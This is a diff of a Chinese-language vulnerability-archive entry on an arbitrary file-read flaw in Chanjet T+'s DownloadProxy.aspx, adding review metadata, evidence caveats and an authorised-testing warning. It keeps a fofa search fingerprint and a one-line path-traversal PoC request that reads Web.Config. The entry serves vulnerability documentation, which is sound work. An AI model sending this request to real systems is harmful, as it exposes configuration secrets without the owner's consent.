@@ -1,11 +1,50 @@
 ---
-fofa: "语句**"
 source: "MrWQ/vulnerability-paper"
+title: "畅捷通T+ DownloadProxy Path文件读取"
+product: "畅捷通T+"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "未列版本；进程权限/路径布局"
+prerequisites: "preload=1条件"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/3OxCCNdncelMJWLjJ-f2qA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%95%85%E6%8D%B7%E9%80%9A/%E7%95%85%E6%8D%B7%E9%80%9A%20TPlus%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: "语句**"
+id: "vw-24ac0c232aee678901dda706"
+entity_id: "ve-24ac0c232aee678901dda706"
+schema_version: "1"
 ---
 
-# 畅捷通 TPlus DownloadProxy.aspx 任意文件读取漏洞
+# 畅捷通T+ DownloadProxy Path文件读取
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：畅捷通T+；DownloadProxy Path文件读取
+- 版本、配置及部署条件：未列版本；进程权限/路径布局
+- 认证与权限前提：preload=1条件
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 影响版本重复产品名，缺真版本；与215读取段同接口
+- 只有请求行和图片，补响应文本/鉴权及补丁
+- fofa误抽语句**，去重复法律免责声明与装饰图
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3OxCCNdncelMJWLjJ-f2qA)
 
 **漏洞简介**
@@ -35,7 +74,7 @@ app="畅捷通-TPlus"
 
 POC：
 
-```
+```http
 GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
 
 ```
